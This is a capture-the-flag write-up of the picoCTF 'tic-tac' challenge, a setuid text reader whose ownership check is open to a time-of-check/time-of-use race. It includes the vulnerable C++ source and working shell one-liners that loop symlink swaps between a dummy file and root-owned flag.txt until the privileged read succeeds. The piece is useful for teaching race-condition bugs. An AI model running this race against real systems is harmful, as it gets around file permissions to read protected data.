# Writeup - tic-tac
Category: Binary Exploitation, Points: 200


## Descpriton

> Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.

We connect to the VM with `ssh`. Further details are given when the instance is launched.


## Vulnerability

After `ssh`ing into the VM. 

We can `ls` the current directory.

```
>ls
flag.txt  src.cpp  txtreader
```

We can see there is a `src.cpp` source file, a `flag.txt` file and a binary `./txtreader` file.

We can read `src.cpp` file.

```cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

Now, the program is quite simple. It reads a file into the `file` pointer, and checks if the `file` is owned by the same person who created it. The `getuid` function returns your user-id, and the `statbuf.st_uid` returns the id of the `file` owner.

If you run:

```console
>./txtreader src.cpp
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

If we try to read the `flag.txt` file like this:

```console
$ ./txtreader flag.txt
Error: you don't own this file
```

It doesn't read it because we didn't create the `flag.txt` file. The `root` user has created it.

Now let's think of adding a `symlink`. If we create a `symlink` to `flag.txt`. It should trick the program into printing the contents of `flag.txt`, because we created the `symlink` hence we are the owners, and so it should pass the check.

```console
$ ln -sf flag.txt link  ##create the symlink
$ ./txtreader link
```

Unfortunately, this fails. The reason being the `stat` function resolves the `symlink` to it's orignal file `flag.txt`. Hence, on the `statbuf.st_uid` call, it gives the user-id for `root`.

If we see the challange tags, there is a tag called `toctou`. Google it and this results into a `time-of-check-time-of-use` attack. `toctou` attacks are caused by something called [Race Conditions](https://en.wikipedia.org/wiki/Race_condition). 

Race Conditions happen when two or more operations are running in parallel.

There is a Race Condition in the `src.cpp` file, caused by 2 instances. Firstly, it checks the ownership of the file. Secondly, it reads the file. We want to swap the file between when it checks ownership and when it reads.

```console
check_ownership(file) -- file is a dummy file owned by us

swap the file -- from the dummy file to flag.txt

read_file(file) -- read the flag.txt file!
```


## Exploit

First we create a dummy `random.txt` file.

Then, we can swap the `file` with a `symlink`. The basic idea is to keep swapping the `symlink` between `flag.txt` and our dummy file `random.txt`, for some amount of time in the background.

We can do this by:

```console
$ timeout 30s bash -c 'while true; do ln -sf random.txt flag; ln -sf flag.txt flag; done' &
```

The `timeout` command times-out after 30 seconds.

We then try to run `txtreader` multiple times so that we swap the file at the right time.

```console
$ while ! ./txtreader flag 2> /dev/null | grep "picoCTF"; do :; done
```

We should get the flag.


## References

[Link 1](https://brandon-t-elliott.github.io/tic-tac)
[Link 2](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)


